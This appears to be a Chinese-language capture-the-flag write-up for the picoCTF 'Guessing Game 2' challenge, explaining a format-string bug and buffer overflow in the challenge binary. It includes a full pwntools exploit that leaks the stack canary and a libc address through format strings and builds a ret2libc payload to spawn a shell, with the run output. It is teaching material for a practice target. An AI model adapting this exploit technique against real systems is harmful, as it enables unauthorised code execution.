---
layout: post
title: picoCTF - Guessing Game 2
slug: picoCTF - Guessing Game 2
category: PWN
published: true
---

[picoCTF - GuessingGame2](https://play.picoctf.org/practice/challenge/89?category=6&page=1)

## Analysis

输入随机数确认成功，输入名字后可以bof

```c
void win() {
 char winner[BUFSIZE];
 printf("New winner!\nName? ");
 gets(winner);
 printf("Congrats: ");
 printf(winner);
 printf("\n\n");
}
```

这里的`printf(winner)`存在字符串格式漏洞利用，可以通过类似`%n$p`的方法来获得找到第n个参数位置保存的值

检查下保护：

```bash
[*] '/home/clot/CTF/GuessGame2/vuln'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

可以看到有Canary，那就可以通过字符串格式漏洞来找到这个canary来绕过。

## Solution

1. 确认随机数

2. leak libc里puts的地址，获得libc的基地址，生成`system`和`/bin/sh`的地址

3. leak canary的地址

4. 构造payload来exploit

## Random Number

这里的随机数由于服务器和本地libc版本的不同，导致生成的随机数是不同的。

当时在随机数上浪费了很多不该浪费的时间，本来是想过暴力破解，但是觉得好慢，就在考虑是不是有别的办法。

程序中是通过`rand`的地址来计算的，然后模上了4096，相当于是&0xfff的操作，那我只要知道这个rand在libc里的地址的后三位就可以了。

我通过GuessingGame1获得的shell，上去就是`lld --version`，当场我就获得了`libc-2.27`的信息..

然而由于对libc版本命名的不理解，导致两次搞错libc的版本，尝试多次无果后，才用了暴力破解的方法。。最后得出结果是-31。

## Leak libc function address

知道结果是-31后其实就知道了rand的在libc里的地址的后三位，通过[libc查询网站](https://libc.blukat.me/?q=system%3Ad80%2Crand%3Afe0&l=libc6-i386_2.27-3ubuntu1.2_amd64)查到对应的libc版本。

对应的`system`和`str_bin_sh`的地址也就都能查到了，还缺一个libc的基地址。

这里通过读取puts的GOT地址，来获得实际地址，可以通过ida或者pwntool获取：`elf.got["puts"]`，地址为`0x08049FDC`

然后我们需要通过输入的格式化字符串来读取这个地址里保存的值。先输入名字，通过gdb来观察下栈的布局：

[![BXZqld.jpg](https://s1.ax1x.com/2020/11/11/BXZqld.jpg)](https://imgchr.com/i/BXZqld)

这个断点是在准备printf输入的名字的时候断下的。字符串开头的`0x41414141`在`0xffffce3c`距离第一个参数地址`0xffffce20`7个4字节参数的位置，所以我们可以输入puts的GOT地址，然后用`%7$.4s`的格式化字符串来获取这个地址的值：

```python
  p.recvuntil('guess?\n')
  p.sendline(n)
  p.recvuntil('\nName? ')
  padding = p32(putsGOTAddress)
  padding += b"%7$.4s"
  p.sendline(padding)
  p.recvuntil('Congrats: ')
  data = hex(u32(p.recvline()[-5:-1]))
```

最后的data便是puts的实际地址，通过以下方法来计算出system和binsh的地址

```python
putsAddress = leakGOTAddress(puts)
baseAddress = int(putsAddress, 16) - libcPusts
systemAddress = baseAddress + systemLibc
binShAddr = baseAddress + binSh
```

## Bypass Canary

依然是用格式化字符串来leak，在ida中可以看到canary的位置：

[![BXuM9S.png](https://s1.ax1x.com/2020/11/11/BXuM9S.png)](https://imgchr.com/i/BXuM9S)

那么只要计算出这个canary距离我们的printf有多少个参数的距离就可以读取出来了：

```bash
pwndbg> x/x $ebp - 0xc
0xffffd03c: 0x0f975a00
pwndbg> p/d (0xffffd03c - 0xffffce20) / 4
$1 = 135

...

pwndbg> c
Continuing.
New winner!
Name? %135$p
Congrats: 0xf975a00

```

## ROP

所需要的条件都已经获取到了，接下来就是拼装payload来ROP了，canary的地方依然放置canary的值，用system的地址覆盖掉返回地址，并在上面放置好参数`/bin/sh`。需要事先观察好栈的布局。

```py
payload = 512 * b'A' + p32(canary) + p32(0) + p32(0) + p32(0)
payload += p32(systemAddress) + p32(1) + p32(binShAddr)
```

## Exploitation

完整的代码：

```py

from pwn import *

REMOTE = 1
elf = ELF('./vuln')
if REMOTE:
  host = 'jupiter.challenges.picoctf.org'
  port = '15815'
  p = remote(host, port)
  n = '-31'
else:
  p = elf.process()
  libc = ELF("libc223-i386.so")
  n = '-1775'
  gdb.attach(p)

def leakAddressByParaNum(paraNo):
  p.recvuntil('guess?\n')
  p.sendline(n)
  p.recvuntil('\nName? ')
  p.sendline('%' + str(paraNo) + '$p')
  p.recvuntil('Congrats: ')
  p.recv(2)
  data = p.recvuntil('\n\n')
  data = int(data, 16)
  return data

def leakGOTAddress(address):
  p.recvuntil('guess?\n')
  p.sendline(n)
  p.recvuntil('\nName? ')
  padding = p32(address)
  padding += b"%7$.4s"
  p.sendline(padding)
  p.recvuntil('Congrats: ')
  data = hex(u32(p.recvline()[-5:-1]))
  return data

binSh = 0x17bb8f
systemLibc = 0x3cd80
libcPusts = 0x673d0
puts = 0x8049fdc

canary = leakAddressByParaNum(135)
print("canary: " + str(hex(canary)))

putsAddress = leakGOTAddress(puts)
baseAddress = int(putsAddress, 16) - libcPusts
systemAddress = baseAddress + systemLibc
binShAddr = baseAddress + binSh
print("systemAddress: " + hex(systemAddress))

payload = 512 * b'A' + p32(canary) + p32(0) + p32(0) + p32(0)
payload += p32(systemAddress) + p32(1) + p32(binShAddr)

def exploit(payload):
  p.recvuntil('guess?\n')
  p.sendline(n)
  p.recvuntil('\nName? ')
  p.sendline(payload)

exploit(payload)
p.interactive()
```

```bash
[+] Opening connection to jupiter.challenges.picoctf.org on port 15815: Done
[*] '/home/clot/CTF/GuessGame2/libc-2.27.so'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
canary: 0xe0b2ae00
systemAddress: 0xf7d7fd80
[*] Switching to interactive mode
Congrats: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
```
